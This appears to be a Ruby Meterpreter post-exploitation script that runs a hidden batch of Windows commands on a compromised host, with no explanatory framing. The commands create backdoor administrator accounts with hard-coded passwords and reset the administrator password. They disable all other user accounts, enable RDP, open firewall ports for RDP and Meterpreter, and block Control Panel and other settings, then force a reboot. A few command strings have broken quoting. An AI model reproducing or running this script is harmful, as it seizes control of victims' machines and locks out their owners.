def list_exec(session,cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
 
             print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
 end
 
 commands = [ 
"net user /add group1", "net localgroup administrators /add group3 ED%Nr-A7#sJYa7Kc4", "net user administrator 3u9j!Q@Td67??tUHc4",
"wmic useraccount where name!='group1'set disabled=true",
"reg add \"hklm\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
"reg add \"hklm\\system\\currentControlSet\\Control\\Terminal Server\" /v \"AllowTSConnections\" /t REG_DWORD /d 0x1 /f",
"reg add \"HKCU\\Control Panel\\Accessibility\StickyKeys\" /v Flags /t REG_SZ /d 506 /f",
"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Authentication\\LogonUI /f /v ShowTabletKeyboard /t REG_DWORD /d 0",
"reg add "\HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f",
"sc config TermService start = auto", "netsh firewall add portopening tcp 3389 RDP",
"netsh advfirewall firewall add rule name='RDP' dir=in action=allow protocol=Tcp localport=3389", 
"netsh firewall add portopening tcp 443 meterpreter", "netsh advfirewall firewall add rule name='Meterpreter' dir=in action=allow protocol=Tcp localport=4444",
"shutdown -r -f -t 0"]
 
 list_exec(client,commands)